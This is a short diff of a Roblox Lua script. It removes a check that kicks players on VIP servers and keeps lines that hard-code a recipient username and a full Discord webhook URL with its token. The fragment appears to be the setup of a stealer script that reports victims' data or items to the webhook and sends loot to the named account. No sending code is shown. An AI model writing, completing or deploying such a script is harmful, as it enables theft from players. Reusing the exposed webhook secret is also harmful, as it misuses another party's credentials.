@@ -1,9 +1,3 @@
--- Проверка типа сервера
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:Kick("Ошибка сервера. Возможно вы на VIP-Сервере")
-    return
-end
-
 local Username = "preppymacdo1"
 local Webhook = "https://discord.com/api/webhooks/1530307687533908069/QN5Vge8NEb_grcxstWh4ElJWkbimA_f8AJYkPsLuUUAS7caG42-Dtjtz74hJi8DjgZ_W"
 
